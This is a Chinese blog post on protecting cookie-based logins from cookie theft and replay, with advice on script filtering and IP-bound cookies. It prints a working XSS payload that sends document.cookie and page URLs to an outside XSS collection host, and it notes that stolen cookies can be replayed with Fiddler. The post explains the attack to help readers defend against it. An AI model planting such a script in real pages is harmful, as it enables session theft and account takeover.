---
title: cookie存储用户信息安全防范（防止模拟登录）
tags:
  - cookie存储用户信息安全防范
  - cookie防止模拟登录
id: 2273
categories:
  - JS/Jq
date: 2016-04-07 09:50:01
---

一般的菜鸟只知道把用户信息保存到Cookie即可，登录只管判断Cookie是否存在，凭借着cookie值的存在情况来判断用户是否登录，更有一些甚至把用户密码也保存在Cookie中，这是极其危险的，人家要搞你分分钟可以模拟你的Cookie来登录你的用户，做一些危险的事情。

**1、攻击者怎么拿到你的登录的Cookie值。**

现在各种攻击技术，目前我只了解XSS攻击方式，做过一个XSS攻击的测试，他在一网站里面发布了一篇博客，里面嵌入了XSS攻击脚步，脚步代码如下：
```javascript
(function() { (new Image()).src = 'http://xss.sssie.com/index.php?do=api&amp;id=RQTPpx&amp;location=' + escape((function() {
try {
return document.location.href
} catch(e) {
return ''
}
})()) + '&amp;toplocation=' + escape((function() {
try {
return top.location.href
} catch(e) {
return ''
}
})()) + '&amp;cookie=' + escape((function() {
try {
return document.cookie
} catch(e) {
return ''
}
})()) + '&amp;opener=' + escape((function() {
try {
return (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href: ''
} catch(e) {
return ''
}
})());
})();
if ('' == 1) {
keep = new Image();
keep.src = 'http://xss.sssie.com/index.php?do=keepsession&amp;id=RQTPpx&amp;url=' + escape(document.location) + '&amp;cookie=' + escape(document.cookie)
};
```

这段代码，是通过第三方XSS平台来的，不过目前有许多的免费XSS平台，自己也可以搭建一个。

通过嵌入以上脚步，只要用户登录了自己的帐号，一旦浏览了攻击者发布的博客，即攻击成功，XSS第三方平台里面发送有关我登录的Cookie 给攻击者，这样你登录的Cookie值立马给窃取，是不是很危险呢？

**2、攻击者模拟Cookie登录**

做过后台开发的人都知道怎么模拟Cookie信息去登录，除非是菜鸟，这个我就不多说了，

不过不会后台开发的人，会使用一些工具，比如Fiddler 就很容易把Cookie信息模拟登录了，这里就不一一讲述实现过程了

仅仅通过简单的模拟用户的Cookie就可以分分种使用你的帐号登录了，并做一些危险的动作，比如删除你的东西，以及更多危险的操作。

到了这里是不是觉得很危险？接下来我来讲述怎么防止这种模拟

以下讲述两点防止的方法：

**1、网站本身做一些脚步拦截，以及脚步检验工作**

比如web站点使用过富文本，一般富文本默认都会对脚本进行拦截，但是有些需要是需要开启这个用户引用脚步的，针对这些就的对用户输入引用的脚本做安全的验证工作，检查风险性，对于风险脚步进行拦截处理，不让提交等。这样就可以在用户输入层避免了XSS攻击的来源了**
**

**2、Cookie层本身做正确性校验**

后台判断是否登录做严格的验证校验工作，不仅仅只判断Cookie是否存在，而要做严格的正确性验证，这里我提供以下IP校验的方式来验证是否是有效登录。

可以把用户请求的IP值和用户的唯一ID做一个特殊加密处理，这样Cookie信息中包含了用户登录的IP地址，这是很多大型网站都是这样做的安全登录，大家应该见过一些金融产品，如果换了一个网络，是不是提示要重新登录呢？这就是根据IP地址校验来防止攻击。

Cookie值中保存了用户的IP值，这样每次登录的时候判断IP地址和当前请求的IP地址是否一致，如果一致则通过验证，IP不一致则说明是异常登录，验证不通过。

总结：目前Cookie模拟登录安全防范就已经完结了，谢谢大家的支持，